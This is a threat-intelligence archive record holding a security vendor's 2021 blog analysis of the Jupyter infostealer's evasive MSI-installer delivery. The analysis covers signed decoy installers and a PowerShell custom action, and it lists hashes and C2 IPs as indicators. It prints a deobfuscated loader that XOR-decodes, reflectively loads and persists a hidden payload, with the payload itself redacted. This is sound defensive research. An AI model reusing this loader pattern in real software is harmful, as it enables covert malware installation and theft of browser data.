{
    "id": "19b21c08-00e3-4afe-8ae4-1b29548282c1",
    "created_at": "2023-01-12T15:01:10.146759Z",
    "updated_at": "2025-03-27T02:15:35.444294Z",
    "deleted_at": null,
    "sha1_hash": "b64dba2d597d8c02339346d59b1908f65daaac11",
    "title": "2021-09-21 - New Jupyter Evasive Delivery through MSI Installer",
    "authors": "",
    "file_creation_date": "2022-05-28T15:19:52Z",
    "file_modification_date": "2022-05-28T15:19:52Z",
    "file_size": 865052,
    "plain_text": "# New Jupyter Evasive Delivery through MSI Installer\n\n**[blog.morphisec.com/new-jupyter-evasive-delivery-through-msi-installer](https://blog.morphisec.com/new-jupyter-evasive-delivery-through-msi-installer)**\n\nPosted by [Nadav Lorber on September 21, 2021](https://blog.morphisec.com/author/nadav-lorber)\nFind me on:\n[Twitter](https://twitter.com/LNadav)\n\n[Tweet](https://twitter.com/share)\n\n\n-----\n\n[In 2020, Morphisec introduced the Jupyter infostealer, a .NET attack that primarily targets](https://blog.morphisec.com/jupyter-infostealer-backdoor-introduction)\nChromium, Firefox, and Chrome browser data while also maintaining the additional\ncapabilities of a backdoor.\n\nSince that time, Jupyter has remained active and highly evasive. It has continued to receive\nvery low to zero detections in the VirusTotal database, maintaining the ability to bypass\ndetection solutions.\n\nThen, on 8 September 2021, we identified a new delivery chain within Jupyter that passes\nunder the radar of security solutions. Following this discovery, the Morphisec Labs team has\nbeen made aware of multiple high-level targets that are under threat from the Jupyter\ninfostealer. We are currently investigating the scope of the campaign.\n\nThe blog post that follows outlines the new delivery chain, showcasing how threat actors\ncontinue to develop their attacks to become more efficient and evasive.\n\n_Editor's Note: This blog post has been updated as per the request of Advanced Installer._\n\n## Technical Introduction\n\n\n-----\n\nFigure 1: The attack flow of the new Jupyter infostealer\n\n### The MSI Payload\n\nIn this section, we will briefly examine some of the payload`s shared attributes in order to get\nan overview of what indicators to expect. This is based on the six variants that we have\nobserved.\n\n**Payload Size and Name**\n\nLike previous Jupyter payloads, the size of the MSI payloads is consistently over 100MBs.\nThis allows the payload to thwart online AV scanners.\n\nThe naming convention for the payload is:\n\nPotential document subjects\nWords are separated with a dash ‘-’\nEach word starts with a capital letter\n\nExamples can be found in the IOCs section under the heading “MSI Payload Names.”\n\n**MSI Third-Party Installer Wizard**\n\n[The payloads were generated with a trial version of Advanced Installer (version 18.6.1 build](https://www.advancedinstaller.com/)\n_2c9a75c6)._\n\nAs described on their website, the Advanced Installer wizard is an ‘All-in-one’ application\npackaging tool. By using this tool, threat actors gain access to the easy implementation of\nobscured script executions.\n\nCustomizing installer PowerShell operations is a legitimate functionality that the attackers\nmisuse, as with other attack chains. This same operation is frequently used as part of\nlegitimate products or services. We advise against flagging any PowerShell scripts\noriginating from Advanced Installer without prior evaluation of the command itself. It is worth\nnoting as well that PowerShell functionalities are also available in other installers\n\n\n-----\n\nThe attribution can be found either in the file properties (OLE Compound) or in the Installer\nproperty table.\n\nFigure 2: OLE Compound file information\n\nFigure 3: Property table\n\n**Decoy Installation Executable**\n\nAs seen in Figure 1 above, all of the observed variants are described as Nitro Pro 13. Once\nthe victim runs the MSI payload, it executes a legitimate installation binary of Nitro Pro 13.\nCorrelating this attribution with the variant’s file names suggests that the delivery method\ndisguises it as a PDF.\n\n\n-----\n\nFigure 4: Nitro Pro 13 Installation\n\nWhile all of the variants are described as Nitro, one of them actually contains SumatraPDF\ninstead.\n\nFigure 5: Sumatra PDF installation\n\n**Digital Signature**\n\nTwo of the variants are signed with a (currently) valid certificate named ‘TACHOPARTS SP Z\n_O O’._\n\n\n-----\n\nFigure 6: Tachoparts certificate\n\nBased on the following certificate data, we can assume that the threat actor either\nimpersonated the certificate or stole it from a legitimate business in Poland.\n\nFigure 7: Tachoparts' business information from Google\n\n\n-----\n\nAnother variant was signed with a revoked certificate named _OOO Sistema ._\n\nFigure 8: OOO Sistema certificate\n\nAs with the previous certificate, this one is also correlated with a legitimate business. It also\nwas likely either an impersonation or stolen from the business.\n\nFigure 9: OOO Sistema business information from Google\n\n\n-----\n\nThe other 2 variants are signed with certificates named:\n\nFORMICA Solutions a.s.\nOOO Ruvents\n\n### The PowerShell Execution\n\nThe initial suspicious indicator visible in the dynamic analysis is the PowerShell commandline spawned by msiexec.exe.\n\n**Command Line**\n\nC:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile Noninteractive\n\n-ExecutionPolicy Bypass\n\n-File 'C:\\Users\\<USERNAME>\\AppData\\Local\\Temp\\pssEA35.ps1'\n\n-propFile 'C:\\Users\\<USERNAME>\\AppData\\Local\\Temp\\msiEA13.txt'\n\n-scriptFile 'C:\\Users\\<USERNAME>\\AppData\\Local\\Temp\\scrEA14.ps1'\n\n-scriptArgsFile 'C:\\Users\\<USERNAME>\\AppData\\Local\\Temp\\scrEA15.txt'\n\n-propSep ' :<->: '\n\n-testPrefix '_testValue.'\n\nCode block 1: CMD Shell command-line\n\nThis command-line is generated by a feature in the Advanced Installer that is designed to\nexecute the PowerShell loader as a ‘CustomAction’ attribute defined in MSI Installers.\n\nThe file names within the parameters differ between variants but keep the same pattern. For\nexample in ‘scrEA14.ps1’, the EA14 is represented by four hex characters. These four\ncharacters are different between the payload variants.\n\nFigure 9: PowerShell loader embedded in the CustomAction within AdvancedInstaller\n\nFigure 10: PowerShell loader embedded in the CustomAction within AdvancedInstaller\n\n### Jupyter PowerShell loader\n\n\n-----\n\nThe PowerShell file in the -scriptFile parameter presented in Code block 1 represents the\nJupyter PowerShell loader.\n\nThis loader is very similar to the previous Jupyter loaders in that it keeps a very evasive file\nwith low to 0 detections on VirusTotal, which is rare for a full PowerShell loader (loader code\nwith an embedded payload).\n\nWhile the Jupyter loaders are widely covered in our and other blogs, the new variant shares\nthe same code pattern. The following code block is an example of a deobfuscated and\nbeautified version of it:\n\n$b64_enc_payload = 'deducted';\n$random_path_str = jeiJBgXRTuVfsm;\n$payload_directory_path = \"$ENV:APPDATA\\Microsoft\\\" + $random_path_str;\n$enc_payload_path = $payload_directory_path + '\\' + $random_path_str + '.' +\n$random_path_str;\n\n[System.IO.File]::WriteAllBytes($enc_payload_path,\n\n[System.Convert]::FromBase64String($b64_enc_payload));\n\n$decode_and_execute_payload_script = 'below code embedded in comment'\n'''\n$xor_key = \"deducted base64 key\";\n$b64_enc_payload = [System.IO.File]::ReadAllBytes($enc_payload_path);\nFor ($i = 0; $i -lt $b64_enc_payload.Count;) {\nFor ($y = 0; $y -lt $xor_key.Length; $y++) {\n$b64_enc_payload[$i]=$b64_enc_payload[$i] -bxor $xor_key[$y];\n$i++;\nif($i -ge $b64_enc_payload.Count) {\n$y=$xor_key.Length\n}\n}\n};\n[System.Reflection.Assembly]::Load($b64_enc_payload); // Loads ‘interact’ method\n'''\n\nCreate_Registry_Key-reg_path (“<REG_PATH”>) -execution_command ('Powershell WindowStyle\nHidden -ep Bypass -Command \" + $decode_and_execute_payload_script');\nCreate_Registry_Key-reg_path (“<REG_PATH”>) execution_command$random_path_str.ToLower();\n\n$lnk_object = New-Object-ComObjectWScript.Shell.CreateShortcut($ENV:APPDATA +\n'<Startup_Lnk_Path');\n$lnk_object.TargetPath = $payload_directory_path + '\\' + $random_path_str;\n$lnk_object.WindowStyle = 7;\n$lnk_object.Save();\n\nIEX $decode_and_execute_payload_script;\n\n\n-----\n\nCode block 2: Deobfuscated Jupyter PowerShell loader\n\nNote that like the previous versions, this one also reflectively loads a DLL that initializes\nexecution under the Deimos namespace in the Mars class (Mars.Deimos).\n\n### The .NET DLL Payload\n\nIn our previous blog, we attributed the payloads to their internal version. The following table\ncorrelates the observed internal version and the MSI payload’s first submission date and\ndetections on VirusTotal.\n\n**Jupyter DLL Internal Version** **VirusTotal First Submission**\n\nSP-9 08 September 2021\n\n1 / 57 Malicious detections\n\nSP-10 08 September 2021\n\n2 / 57 Malicious detections\n\nSP-11 10 September 2021\n\n0 / 57 Malicious detections\n\nSP-13 13 September 2021\n\n0 / 57 Malicious detections\n\nSP-14 21 September 2021\n\n0 / 57 Malicious detections\n\nSP-16 21 September 2021\n\n0 / 57 Malicious detections\n\nWhile all of the .NET DLL Payloads should be obfuscated, it appears that the SP-10 variant\ncontains source-code strings. The following figure presents the payload methods and class\nnames.\n\n\n-----\n\nFigure 11: Jupyter .NET DLL Payload methods and classes\n\n### Conclusion\n\nThe evolution of the Jupyter info stealer/backdoor from when we first identified it in 2020\nproves the truth of the statement that threat actors are always innovating. That this attack\ncontinues to have low or no detections on VirusTotal further indicates the facility with which\n\n\n-----\n\nthreat actors evade detection-based solutions. It s clear that a new approach is required to\nthreat prevention, as it’s likely these evasive attacks will continue.\n\nThis is why Morphisec architected its solutions to emphasize deterministic prevention of\nevasive attacks instead of detection. Customers who leverage the Morphisec Breach\nPrevention Platform on their endpoints, on-premises servers, and in the cloud can remain\nconfident that they are secure from evasive threats such as the Jupyter infostealer\nregardless of the detection rate in VirusTotal.\n\n## IOCs\n\n### MSI Payload Hashes\n\nbc7986f0c9f431b839a13a9a0dfa2711f86e9e9afbed9b9b456066602881ba71\n\n1197067d50dd5dd5af12e715e2cc00c0ba1ff738173928bbcfbbad1ee0a52f21\n\n8e06c31285911c936425921ccf9f20107160174acd602cc7f2dd8ca677e8956d\n\n9e3b4e4948521467216515e92812e5a47fb23f5bcb3a8b1a6014ae2f038c7181\ne466158ff4c6da37213dc9e0f05038d05ebead93febf51a5ec3ac6e2b9e3e22d\n8447b77cc4b708ed9f68d0d71dd79f5e66fe27fedd081dcc1339b6d35c387725\n\n28b41fbae3fec855c2f4779dde8d4e990d3e5ceede80a89bcf420a59459d84b8\n\n7ada6e666c34aacaf7c93d11ca2e563ec53da37fb23a181631809d0d5ef14387\n\n57171e869512862baa9e4fd15b18c1d577a31f2ca20b47435f138f989bca2d72\n\n394fa8af1348cbcf3d9beae6dc8b6afb24c6b96bcc3be52601a5b84f9adf007c\n\n3b0950f1602b43e7cadc43740de00c77ab481c8459cacd7397dd66d1d75d2641\n\n5cf24553e521de102628e1ebdadb69a6623904f08b51cf5b1ea14779e03e8682\n7f3cfd60860c47fc730643f58fcd10a8c9361c3a8de0fd162ea2751e4c514271\n\nb1620fbd2194bc09812c01134b7f60292cfbabd26f1360ecb04c1f66cb2dd4f5\n\n10221ceffbc7d7e59b17b1968d0fa01c8124efa70d1d5a486e53211e4754a22d\n\n341881d11fd748a81c8cee584dc42392a564aeb839faf7afa136004701e656c1\n\n619678ea113d164106f22ce5a9145d2cc87ef730461015dcd5a4343d05420a55\n\nc61348ab7e5ffeb9ba5d1077b13c49bde4d841c5ada9a119f8234af89421f783\n\n3303926a6468dab25286a65bb9f3e5883a8938e6501031b3b85e21f182d1ed0d\n\n1e7914f799371cbc8560bc52203d3531bb20cb4f6092158c76a4842dbf85dabc\n\n### AdvancedInstaller PowerShell Hash\n\n\n-----\n\n88748aae11029228d84aef0855f4bc084dfd70450db1f7029746d8bc85182f93\n\n### Jupyter PowerShell Loader Hashes\n\n934cb210db692c3ebcd9ba8d113b1669573a20db79c02a2587a4bead10d8dfeb\n\ne34af1b6edf33b155ca9854d084577c30e1bc9d96eee10014277a0e55a47beef\n\nf6aa48bc45be3b603a48a5261a28cc75e9c1c2f65aa37bb807b6c1bd80dce05a\n\n8bd8fa4a5500d390d69941cb5d89a568d46d49bc4ac731a6c548b7d8e69625c2\n\n1d90b6c3b59a4287697c81a10ea950bda9326af8b629ef59c8b5bde3a7486683\n\n42c62c6bdd12f6ed12f65e6bebc05b2980fb1594d3efa9abdf81ac61bbbd6fc8\n\nf8ffeda0cf4e3519a3af952f17ac137aa59b7d547612e5b6595dad4e26165027\n\n0ef218d23cd230f09a729965863394f36a0b82d78f7ff50381cac3bbec3bbcab\n\nab1aa0bf3562fbc6de28e12a4625bf8fe541457d8991e14070529031a0b499e5\n\n### Jupyter Payloads\n\n8bcf6506b21f67641fa753d7328d3c1045541f84bc62bbe43d485f38e3d5e3ae\n\n1f034e91613ab7c290d172b87200a000365728f218cbd4491f59d09a20bfd866\n\n8c35f2a78e366abf2450d5882c49c69ee5cc01dba3743938b45cedc2b5dee3a3\n\n1c5082cb7fbd011feb14909320b163b038febed29700568f9a2c7b5a416fad51\n2524cea17b8ec62d30a93751fc42cc4e33350caaff5ba9a2327c048b715b2d4a\n\n39b0e2965daf855fbd25facbdd0dcb84e3a2103d0ac37699b27284dd918dfcb7\n\n01f0cef500ace135fce8ad80a3e37078a6af8433b6877e1aa461da4afe80c111\n\n0e6c901e3b98d2714dc31a29e92a0c89798bfa42c792b661eb19564401606499\n\ned4370be662514e83c484b7eff043b5da4c58d268c6a0ca2d087c50a4b761eb7\n\nd5bab9db44e9b9b27cf32442e061a4b63968ed2f1286fe8b0db0e317b17feee9\n\nd10b7a077a506f76cc14ff96f348f3cf114a8ea3e311f7061e60cce2f2cc5550\n\ne46fb74c7a478177b1487d945964bd8cbdb853b485087e85e9bb777470872a7f\n\nac436440000a417e0a2f699b7fd966ff67935251dedc98c9b9c19c61ee930d83\n\n### C2 IPs\n\n45.42.201[.]248\n\n37.120.237[.]251\n\n188.241.83[.]61\n\n146.70.41[.]157\n\n149.255.35[.]179\n\n37.221.114[.]23\n\n### MSI Payload Names\n\n\n-----\n\nMetlife-Disability-Waiver-Of-Premium-Benefit-Rider.msi\n\nMedical-Engagement-Scale-Questionnaire.msi\n\nDue-Diligence-Checklist-For-Oil-And-Gas-Properties.msi\n\nNon-Renewal-Of-Lease-Letter-To-Landlord-From-Tenant.msi\n\nFedex-Tracking-By-Shipper-Receipt.msi\n\nChristian-Doctrine-Clauses-List.msi\n\nOmnicell-Cabinet-User-Manual.msi\n\nWells-Fargo-Subpoena-Processing-Department-Phoenix-Az.msi\n\nBulgarian Power Burst Training pdf.msiapp.msi\n\n[Contact SalesInquire via Azure](http://10.10.0.46/mailto:sales@morphisec.com)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-09-21 - New Jupyter Evasive Delivery through MSI Installer.pdf"
    ],
    "report_names": [
        "2021-09-21 - New Jupyter Evasive Delivery through MSI Installer.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "9f101d9c-05ea-48b9-b6f1-168cd6d06d12",
            "created_at": "2023-01-06T13:46:39.396409Z",
            "updated_at": "2025-03-27T02:00:03.074969Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "CHROMIUM",
                "ControlX",
                "Red Dev 10",
                "RedHotel",
                "Red Scylla",
                "TAG-22",
                "BRONZE UNIVERSITY",
                "AQUATIC PANDA",
                "Charcoal Typhoon",
                "BountyGlad"
            ],
            "source_name": "MISPGALAXY:Earth Lusca",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "9041c438-4bc0-4863-b89c-a32bba33903c",
            "created_at": "2023-01-06T13:46:38.232751Z",
            "updated_at": "2025-03-27T02:00:02.778714Z",
            "deleted_at": null,
            "main_name": "Nitro",
            "aliases": [
                "Covert Grove"
            ],
            "source_name": "MISPGALAXY:Nitro",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a2b44a04-a080-4465-973d-976ce53777de",
            "created_at": "2022-10-25T16:07:23.911791Z",
            "updated_at": "2025-03-27T02:02:10.025108Z",
            "deleted_at": null,
            "main_name": "Nitro",
            "aliases": [
                "Covert Grove",
                "Nitro"
            ],
            "source_name": "ETDA:Nitro",
            "tools": [
                "AngryRebel",
                "Backdoor.Apocalipto",
                "Chymine",
                "Darkmoon",
                "Farfli",
                "Gen:Trojan.Heur.PT",
                "Gh0st RAT",
                "Ghost RAT",
                "Moudour",
                "Mydoor",
                "PCClient",
                "PCRat",
                "Poison Ivy",
                "SPIVY",
                "Spindest",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "6abcc917-035c-4e9b-a53f-eaee636749c3",
            "created_at": "2022-10-25T16:07:23.565337Z",
            "updated_at": "2025-03-27T02:02:09.868522Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Bronze University",
                "Charcoal Typhoon",
                "Chromium",
                "Red Dev 10",
                "Red Scylla"
            ],
            "source_name": "ETDA:Earth Lusca",
            "tools": [
                "Agentemis",
                "AntSword",
                "BIOPASS",
                "BIOPASS RAT",
                "BadPotato",
                "Behinder",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "Doraemon",
                "FRP",
                "Fast Reverse Proxy",
                "FunnySwitch",
                "HUC Port Banner Scanner",
                "KTLVdoor",
                "Mimikatz",
                "NBTscan",
                "POISONPLUG.SHADOW",
                "PipeMon",
                "RbDoor",
                "RibDoor",
                "RouterGod",
                "SAMRID",
                "ShadowPad Winnti",
                "SprySOCKS",
                "WinRAR",
                "Winnti",
                "XShellGhost",
                "cobeacon",
                "fscan",
                "lcx",
                "nbtscan"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d53593c3-2819-4af3-bf16-0c39edc64920",
            "created_at": "2022-10-27T08:27:13.212301Z",
            "updated_at": "2025-03-27T02:00:55.529662Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Earth Lusca",
                "TAG-22",
                "Charcoal Typhoon",
                "CHROMIUM",
                "ControlX"
            ],
            "source_name": "MITRE:Earth Lusca",
            "tools": [
                "Mimikatz",
                "PowerSploit",
                "Tasklist",
                "certutil",
                "Cobalt Strike",
                "Winnti for Linux",
                "Nltest",
                "NBTscan",
                "ShadowPad"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535670,
    "ts_updated_at": 1743041735,
    "ts_creation_date": 1653751192,
    "ts_modification_date": 1653751192,
    "files": {
        "pdf": "https://archive.orkl.eu/b64dba2d597d8c02339346d59b1908f65daaac11.pdf",
        "text": "https://archive.orkl.eu/b64dba2d597d8c02339346d59b1908f65daaac11.txt",
        "img": "https://archive.orkl.eu/b64dba2d597d8c02339346d59b1908f65daaac11.jpg"
    }
}